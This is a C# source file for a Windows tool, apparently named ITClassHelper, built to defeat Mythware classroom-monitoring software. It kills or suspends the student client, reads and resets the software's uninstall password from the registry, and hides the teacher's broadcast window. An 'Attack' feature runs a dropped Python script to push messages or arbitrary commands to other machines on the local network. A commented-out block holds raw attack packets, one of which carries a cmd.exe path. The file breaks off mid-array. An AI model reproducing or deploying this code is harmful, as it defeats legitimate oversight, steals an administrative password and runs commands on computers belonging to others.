﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ITClassHelper
{
    public partial class MainWindow : Form
    {
        public static class ProcessMgr
        {
            [Flags]
            public enum ProcessAccess : uint
            {
                Terminate = 0x1,
                CreateThread = 0x2,
                SetSessionId = 0x4,
                VmOperation = 0x8,
                VmRead = 0x10,
                VmWrite = 0x20,
                DupHandle = 0x40,
                CreateProcess = 0x80,
                SetQuota = 0x100,
                SetInformation = 0x200,
                QueryInformation = 0x400,
                SetPort = 0x800,
                SuspendResume = 0x800,
                QueryLimitedInformation = 0x1000,
                Synchronize = 0x100000
            }
            [DllImport("ntdll.dll")]
            private static extern uint NtResumeProcess([In] IntPtr processHandle);
            [DllImport("ntdll.dll")]
            private static extern uint NtSuspendProcess([In] IntPtr processHandle);
            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern uint NtTerminateProcess([In] IntPtr processHandle);
            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr OpenProcess(
             ProcessAccess desiredAccess,
             bool inheritHandle,
             int processId);
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool CloseHandle([In] IntPtr handle);
            public static void SuspendProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.SuspendResume, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtSuspendProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }
            public static void ResumeProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.SuspendResume, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtResumeProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }

            public static void TerminateProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.Terminate, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtTerminateProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }
        }

        string[] args;
        static readonly string ProgramVersion = "1.3.3";
        static readonly string TerminalVersion = "0.2.0";
        readonly string disablerFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\disableAttack.txt";
        readonly string termInfo =
$@"机房助手命令终端 KillerTerm
作者：Ujhhgtg
版本：{TerminalVersion}";

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "MoveWindow")]
        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
        
        [DllImport("user32.dll", ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();
        
        [DllImport("user32.dll", EntryPoint = "SetForegroundWindow")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);
        
        public MainWindow(string[] args)
        {
            this.args = args;
            InitializeComponent();
            ProgramVerLabel.Text += ProgramVersion;
            TerminalOpTextBox.Text += termInfo;
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            if (File.Exists(disablerFilePath))
            {
                DisableAttackButton.Enabled = false;
                AttackButton.Enabled = false;
            }
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string ntsdPath = path + @"\ntsd.exe";
            if (!File.Exists(ntsdPath))
            {
                byte[] RescNtsd = Properties.Resources.Ntsd;
                FileStream ntsdFsObj = new FileStream(ntsdPath, FileMode.CreateNew);
                ntsdFsObj.Write(RescNtsd, 0, RescNtsd.Length);
                ntsdFsObj.Close();
            }
            string scriptPath = path + @"\attacker.py";
            byte[] RescAttacker = Properties.Resources.Attacker;
            FileStream attackerFsObj = new FileStream(scriptPath, FileMode.Create);
            attackerFsObj.Write(RescAttacker, 0, RescAttacker.Length);
            attackerFsObj.Close();
            if (args.Length > 0)
            {
                Hide();
                ParseTerminal(args);
                Environment.Exit(0);
            }
            else
            {
                new Thread(LoopThread)
                { IsBackground = true }.Start();
            }
        }

        private void ParseTerminal(string[] commands)
        {
            switch (commands[0])
            {
                case "info":
                    OutputTerminal(termInfo);
                    break;
                case "kill":
                    if (commands.Length >= 2 && commands[1] != "")
                    {
                        CloseApp(commands[1]);
                        OutputTerminal($"信息：已杀死 {commands[1]}。");
                    }
                    else
                    {
                        OutputTerminal("错误：参数不足！");
                    }
                    break;
                case "pass":
                    if (commands[1] == "get")
                    {
                        if (args.Length == 0)
                        {
                            OutputTerminal($"信息：密码为：{GetPswd()}。");
                        }
                        else
                        {
                            using (StreamWriter sw = new StreamWriter("极域密码.txt"))
                            {
                                sw.WriteLine(GetPswd());
                            }
                        }
                    }
                    else if (commands[1] == "set")
                    {
                        if (commands.Length >= 3 && commands[2] != "")
                        {
                            SetPswd(commands[2]);
                            CloseApp();
                            RecoverApp(true);
                            OutputTerminal($"信息：密码已设置为：{commands[2]}。");
                        }
                        else
                        {
                            OutputTerminal("错误：参数不足！");
                        }
                    }
                    break;
                case "help":
                    OutputTerminal(
@"info : 输出终端信息。
help : 输出帮助信息。
kill ProcName : 杀死名为 ProcName 的进程。
pass {get / set} :
    get:
        获取极域密码。
    set Pswd:
        设置极域密码为 Pswd。"
                        );
                    break;
                default:
                    OutputTerminal("错误：命令不存在！");
                    break;
            }

        }

        private void OutputTerminal(string OpText)
        {
            TerminalOpTextBox.Text += Environment.NewLine + OpText;
        }

        private void LoopThread()
        {
            int ScreenX = Screen.PrimaryScreen.Bounds.Width;
            int ScreenY = Screen.PrimaryScreen.Bounds.Height;
            while (true)
            {
                IntPtr studentWindow = FindWindow(null, "屏幕演播室窗口");
                if (MousePosition == new Point(0, 0))
                {
                    if (MouseActionCloseRadio.Checked == true) CloseApp();
                    else
                    {
                        MoveWindow(studentWindow, 0, 0, 0, 0, true);
                        Thread.Sleep(int.Parse(ProgramHideTextBox.Text) * 1000);
                        MoveWindow(studentWindow, 0, 0, ScreenX, ScreenY, true);
                    }
                }
                if (MousePosition == new Point(0, ScreenY))
                {
                }
                if (studentWindow != IntPtr.Zero)
                {
                    SetForegroundWindow(Handle);
                    Activate();
                }
                Process[] studentProc = Process.GetProcessesByName("StudentMain");
                if (studentProc.Length == 0)
                {
                    AppStatusLabel.Text = "未在运行";
                    AppStatusLabel.ForeColor = Color.Green;
                }
                else
                {
                    AppStatusLabel.Text = "正在运行";
                    AppStatusLabel.ForeColor = Color.Red;
                }
                Thread.Sleep(1000);
            }
        }


        private void ExitProgram_Click(object sender, EventArgs e)
        {
            ShowExitProgram();
        }

        private void ShowExitProgram()
        {
            if (MessageBox.Show("确定退出极域杀手？", "退出", MessageBoxButtons.OKCancel) == DialogResult.OK)
            {
                Environment.Exit(0);
            }
        }

        private void PauseApp_Click(object sender, EventArgs e)
        {
            try
            {
                Process studentProc = Process.GetProcessesByName("StudentMain")[0];
                ProcessMgr.SuspendProcess(studentProc.Id);
            }
            catch { }
        }

        private void CloseApp_Click(object sender, EventArgs e)
        {
            CloseApp();
        }

        private void CloseApp(string killAppName = "StudentMain.exe")
        {
            if (CloseMethodComboBox.SelectedIndex == 0)
            {
                string ntsdPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ntsd.exe";
                ExecuteProcess(ntsdPath, $"-c q -pn {killAppName}");
                new Thread(CleanupNtsd).Start();
            }
            else
            {
                Process studentProc = Process.GetProcessesByName(killAppName.Replace(".exe", ""))[0];
                ProcessMgr.TerminateProcess(studentProc.Id);
            }
        }

        private void GetPswd_Click(object sender, EventArgs e)
        {
            string PswdText = GetPswd();
            MessageBox.Show($"密码为：{PswdText}", "极域密码", MessageBoxButtons.OK);
        }

        private string GetPswd()
        {
            RegistryKey pswdKey;
            try
            {
                pswdKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class Standard\1.00");
            }
            catch { pswdKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class\1.00"); }
            string longPswd = (string)pswdKey.GetValue("UninstallPasswd");
            return longPswd.Replace("Passwd", "");
        }

        private void SetPswd(string pswdText)
        {
            string keyDir = @"HKEY_LOCAL_MACHINE\SOFTWARE\TopDomain\e-Learning Class Standard\1.00";
            Registry.SetValue(keyDir, "UninstallPasswd", $@"Passwd{pswdText}");
        }

        private void ExecuteProcess(string process, string arguments, bool noHide = false)
        {
            Process ExeProcess = new Process();
            ProcessStartInfo ExeProcessInfo;
            if (noHide == true)
            {
                ExeProcessInfo = new ProcessStartInfo
                {
                    FileName = process,
                    Arguments = arguments
                };
            }
            else
            {
                ExeProcessInfo = new ProcessStartInfo
                {
                    FileName = process,
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
            }
            ExeProcess.StartInfo = ExeProcessInfo;
            ExeProcess.Start();
        }

        private void CleanupNtsd()
        {
            Thread.Sleep(1000);
            ExecuteProcess("taskkill", "/f /im ntsd.exe");
        }

        private void RecoverApp_Click(object sender, EventArgs e)
        {
            RecoverApp();
        }

        private void RecoverApp(bool noShowError = false)
        {
            bool gotError = false;
            try
            {
                Process studentProc = Process.GetProcessesByName("StudentMain")[0];
                ProcessMgr.ResumeProcess(studentProc.Id);
            }
            catch
            {
                gotError = true;
            }
            if (gotError == true)
            {
                if (AppPathTextBox.Text == "")
                {
                    string path = @"C:\Program Files\Mythware\e-Learning Class\StudentMain.exe";
                    if (File.Exists(path))
                    {
                        ExecuteProcess(path, "", true);
                    }
                    else
                    {
                        if (noShowError == false) { MessageBox.Show("无法找到极域的位置！请在设置里手动设置！", "错误", MessageBoxButtons.OK); }
                    }
                }
                else
                {
                    ExecuteProcess(AppPathTextBox.Text, "", true);
                }
            }
        }

        private void CloseAppMenuItem_Click(object sender, EventArgs e)
        {
            CloseApp();
        }

        private void ExitProgramMenuItem_Click(object sender, EventArgs e)
        {
            ShowExitProgram();
        }

        private void NotifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Show();
        }

        private void HideProgramButton_Click(object sender, EventArgs e)
        {
            Hide();
        }

        private void RecoverAppMenuItem_Click(object sender, EventArgs e)
        {
            RecoverApp();
        }

        private void ShowHideProgramMenuItem_Click(object sender, EventArgs e)
        {
            Visible = !Visible;
        }

        private void TerminalSendButton_Click(object sender, EventArgs e)
        {
            string[] commands = TerminalIpTextBox.Text.Split(' ');
            TerminalIpTextBox.Text = "";
            ParseTerminal(commands);
        }

        private void CmdMsgRadio_CheckedChanged(object sender, EventArgs e)
        {
            CmdTextBox.Enabled = UseCmdRadio.Checked;
            MsgTextBox.Enabled = UseMsgRadio.Checked;
        }

        private void AttackButton_Click(object sender, EventArgs e)
        {
            string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\attacker.py";
            string baseArguments = $@"{scriptPath} -p {PortTextBox.Text} -ip 192.168.{IPTextBox1.Text}.{IPTextBox2.Text}";
            string formattedMsg = MsgTextBox.Text.Replace("\n", "").Replace("\r", "");
            if (IPTextBox2.Text != IPTextBox3.Text)
            {
                baseArguments += $"-{IPTextBox3.Text}";
            }
            if (UseMsgRadio.Checked == true)
            {
                ExecuteProcess("python", $"{baseArguments} -msg \"{formattedMsg}\"");
                ExecuteProcess("py", $"{baseArguments} -msg \"{formattedMsg}\"");
            }
            else
            {
                ExecuteProcess("python", $"{baseArguments} -c \"{CmdTextBox.Text}\"");
                ExecuteProcess("py", $"{baseArguments} -c \"{CmdTextBox.Text}\"");
            }
        }

        private void IPButton_Click(object sender, EventArgs e)
        {
            string MyIP = string.Empty;
            foreach (IPAddress IPAddresses in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (IPAddresses.AddressFamily.ToString() == "InterNetwork")
                {
                    MyIP = IPAddresses.ToString();
                }
            }
            MessageBox.Show($"您的 IP 地址为：{MyIP}", "IP 地址", MessageBoxButtons.OK);
        }

        private void DisableAttackButton_Click(object sender, EventArgs e)
        {
            DisableAttackButton.Enabled = false;
            try
            {
                File.Create(disablerFilePath); 
            }
            catch { }
        }

        private void UpdateAppButton_Click(object sender, EventArgs e)
        {
            string path = Application.StartupPath + @"\ITCHUpdater.exe";
            if (File.Exists(path))
            {
                ExecuteProcess(path, "", true);
                Environment.Exit(0);
            }
            else
            {
                MessageBox.Show("更新程序不存在！请前往 url.cy/0sR4gf 下载！", "错误", MessageBoxButtons.OK);
            }
        }

        private void InstallPythonLinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            string path = Application.StartupPath + @"\PythonInstaller.exe";
            string arguments =
@"/passive PrependPath=1 InstallAllUsers=0 AssociateFiles=1 Shortcuts=1 
Include_doc=0 Include_debug=1 Include_dev=1 Include_exe=1 Include_launcher=1 
InstallLauncherAllUsers=1 Include_lib=1 Include_pip=1 Include_symbols=1 
Include_tcltk=1 Include_test=1 Include_tools=1";
            if (File.Exists(path))
            {
                ExecuteProcess(path, arguments);
            }
            else
            {
                MessageBox.Show("Python 安装程序不存在！请点击程序中的[更新软件]下载！", "错误", MessageBoxButtons.OK);
            }
        }

        /* SendAttackPack()
        private void SendAttackPack(string attackType, string attackContent)
        {
            List<List<byte>> attackPacks = new List<List<byte>> {
                new List<byte> {
            0x44,
            0x4d,
            0x4f,
            0x43,
            0x00,
            0x00,
            0x01,
            0x00,
            0x9e,
            0x03,
            0x00,
            0x00,
            0x10,
            0x41,
            0xaf,
            0xfb,
            0xa0,
            0xe7,
            0x52,
            0x40,
            0x91,
            0xdc,
            0x27,
            0xa3,
            0xb6,
            0xf9,
            0x29,
            0x2e,
            0x20,
            0x4e,
            0x00,
            0x00,
            0xc0,
            0xa8,
            0x50,
            0x81,
            0x91,
            0x03,
            0x00,
            0x00,
            0x91,
            0x03,
            0x00,
            0x00,
            0x00,
            0x08,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x05,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00
        },
                new List<byte> {
            0x44,
            0x4d,
            0x4f,
            0x43,
            0x00,
            0x00,
            0x01,
            0x00,
            0x6e,
            0x03,
            0x00,
            0x00,
            0x5b,
            0x68,
            0x2b,
            0x25,
            0x6f,
            0x61,
            0x64,
            0x4d,
            0xa7,
            0x92,
            0xf0,
            0x47,
            0x00,
            0xc5,
            0xa4,
            0x0e,
            0x20,
            0x4e,
            0x00,
            0x00,
            0xc0,
            0xa8,
            0x64,
            0x86,
            0x61,
            0x03,
            0x00,
            0x00,
            0x61,
            0x03,
            0x00,
            0x00,
            0x00,
            0x02,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x0f,
            0x00,
            0x00,
            0x00,
            0x01,
            0x00,
            0x00,
            0x00,
            0x43,
            0x00,
            0x3a,
            0x00,
            0x5c,
            0x00,
            0x57,
            0x00,
            0x69,
            0x00,
            0x6e,
            0x00,
            0x64,
            0x00,
            0x6f,
            0x00,
            0x77,
            0x00,
            0x73,
            0x00,
            0x5c,
            0x00,
            0x73,
            0x00,
            0x79,
            0x00,
            0x73,
            0x00,
            0x74,
            0x00,
            0x65,
            0x00,
            0x6d,
            0x00,
            0x33,
            0x00,
            0x32,
            0x00,
            0x5c,
            0x00,
            0x63,
            0x00,
            0x6d,
            0x00,
            0x64,
            0x00,
            0x2e,
            0x00,
            0x65,
            0x00,
            0x78,
            0x00,
            0x65,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
